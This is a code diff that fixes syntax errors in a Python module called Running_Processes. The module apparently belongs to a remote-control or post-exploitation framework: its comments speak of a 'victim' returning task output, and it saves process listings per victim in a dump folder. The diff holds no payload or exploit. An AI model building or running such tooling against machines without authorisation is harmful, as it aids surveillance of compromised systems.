@@ -22,7 +22,7 @@ class Running_Processes(Module):
 	def __init__(self,name,utility,language,options):
 
 		## We are loading the script in the script variable here
-		super(Running_Processes, self).__init__(name,self..description,utility,language,getattr(self,f"script_{language}")(options))    
+		super(Running_Processes, self).__init__(name,self.description,utility,language,getattr(self,f"script_{language}")(options))    
 
 	## This class is called when victim returns the output for the task of this module. What is to be done with the output is defined here
 	def handle_task_output(self,data,options,victim_id,task_id):
@@ -37,9 +37,9 @@ class Running_Processes(Module):
 			os.makedirs(dump_path)
 
 		if self.language == 'python':
-			filename = f"runningprocesses_{time.strftime("%Y%m%d-%H%M%S")}_{task_id}.csv"
+			filename = f"runningprocesses_{time.strftime('%Y%m%d-%H%M%S')}_{task_id}.csv"
 		else:
-			filename = f"runningprocesses_{time.strftime("%Y%m%d-%H%M%S")}_{task_id}.txt"
+			filename = f"runningprocesses_{time.strftime('%Y%m%d-%H%M%S')}_{task_id}.txt"
 
 		file_path = os.path.join(dump_path,filename)
 
